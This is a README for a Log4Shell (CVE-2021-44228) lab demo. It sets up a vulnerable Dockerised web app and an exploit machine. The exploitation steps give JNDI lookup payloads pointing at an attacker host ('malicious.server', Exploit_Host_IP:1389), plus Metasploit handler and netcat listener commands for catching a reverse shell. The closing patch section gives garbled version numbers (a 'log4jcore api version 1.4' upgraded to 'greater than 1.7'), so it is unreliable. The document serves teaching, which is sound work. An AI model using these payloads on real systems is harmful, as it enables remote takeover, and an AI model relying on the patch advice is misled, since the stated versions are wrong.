# Log4j Vulnerability
Log4j vulnerability demo for CVE-2021-44228. <br>
It is based on proof of concept demo by Kozmer and few modifications were made such as adding python and bash to docker to trigger meterpreter.
A new Application was re-built using same POC demo with new log4j libraries 
Kozimer's POC Github Link: https://github.com/kozmer/log4j-shell-poc

The application is vulnerable as it is logging username using Log4j using vulnerable log4j api library.

Logger logger = LogManager.getLogger(com.example.log4shell.log4j.class); </br>
logger.error(userName);</br>
out.println("&#60;code&#62; the password you entered was invalid, &#60;u&#62; we will log your information &#60;/u&#62; &#60;/code&#62;");</br>

As vulnerable application is logging invalid usernames, it is as easy as sending maliciously crafted JNDI lookup as username and malicious.server hosts a malicious Jar file that can create a reverse shell
Username: ${jndi:ldap://malicious.server/Exploit}

<br>
<br>
<br>

# Vulnerable Application setup instrutions(Non docker):

1)Pull/download the vulnerable application from the Github repo which is a modified version of kozmer's Repo:

    Vulenerable machine: https://github.com/sudesh0sudesh/log4jDemo_vulnerable

    Ref:https://github.com/kozmer/log4j-shell-poc

2) Install docker on your system.

   Linux: You can install it by executing the command(sudo apt install docker).
   Windows : Download Docker Desktop application.

3) Traverse into the folder containing the vulnerable application where you can see the docker file.

   To traverse you can use cd in both the operating systems.

4) Execute the below command to create a docker_image.

   Command: docker build . -t &#60;Image_name&#62;

5) Execute the below command to execute the docker_image.

    Command: docker run --network host  &#60;Image_name&#62;





# Setting up of Exploit machine:

1)Pull/download the exploit code from the Github repo:
 
   https://github.com/kozmer/log4j-shell-poc

2) The exploit was built using java 8, Download java-8u20

    https://www.oracle.com/java/technologies/javase/javase8-archive-downloads.html

3) Extract the java application and copy the JDK folder to log4j folder where you can see poc.py file.

    Commands: tar -xf jdk-8u20-linux-x64.tar.gz
             cp -R jdk1.8.0_20  &#60; log4j folder where you can see docker file;

4) Install the requirements needed as the process was automated using a python script that uses colorama(to display colored text) and argparse to read inputs from arguments.

    Commands:   pip install colorama argparse

5) Both Netcat and Metasploit can be used for listing reverse_tcp connections.

        Metasploit installation instructions can be found using the below url

        URL: https://github.com/rapid7/metasploit-framework/wiki/Nightly-Installers

        Netcat can be installed on linux using the below command.
        Command: Sudo apt install netcat

6) Allow the port that you want to allow connections for Ufw and let's call that port as Metasploit_listening_PORT.

    Command: ufw allow  &#60;Metasploit_listening_PORT&#62;

7) Start listening for connections on using reverse_tcp handler on metasploit.
   
    Commands:
        msfconsole -qa(Just to avoid banner).
        use /exploit/multi/handler
        set LHOST &#60;Exploit_Host_IP&#62;
        set LPORT &#60;Metasploit_listening_PORT&#62;
        exploit
    You can do the same thing using netcat.

    nc -lvnp &#60;Metasploit_listening_PORT&#62;

8) Traverse to the folder where poc.py file is present and execute the below command.

     Command: python3 poc.py --userip &#60;Exploit_Host_IP&#62; --webport &#60;Web_PORT&#62; --lport &#60;Metasploit_listening_PORT&#62; 

     Web_PORT can be any port greater than 5000, just to avoid conflicts.
     After the execution of poc.py you will find the JNDI lookup that should be passed as input on terminal.



# Exploitation Procedure/Steps:    

1) Visit the vulnerable webapplication via url.

    http://Vulnerable_machine_IP:8080

2) Now pass JNDI lookup as username and vulnerable application is logging username field on server side.
    
    ${jndi:ldap://Exploit_Host_IP:1389/a}

3) Now if we check metasploit or netcat we will find the reverse shell.


# Patching

1) Vulnerable application is using a log4jcore api version 1.4 which was vulnerable.

2) Download the log4j versions that are greater than 1.7 from the below link.
       
    https://logging.apache.org/log4j/2.x/download.html
    

3) Let's Extract the log4shell-1.0-SNAPSHOT.war and replace the log4j_api_1.4 library with log4j_api_1.7
 
    Path for libraries: log4j-shell-poc-main\target\log4shell-1.0-SNAPSHOT\WEB-INF\lib

4) Rebuild the log4shell-1.0-SNAPSHOT.war using jar which was installed as part of jdk.

    Command: jar -cvf log4shell-1.0-SNAPSHOT.war  *

5) Let's rebuild the docker image with modified application.

    Command: docker build . -t &#60;Image_name&#62;

6) Let's run the modified docker image using the below command.

    Command: docker run --network host  &#60;Image_name&#62;

7) For the sake of this demo, I have already created a non vulnerable machine and stored in my github.

    Non Vuln machine: https://github.com/sudesh0sudesh/Log4jDemo_nonvuln
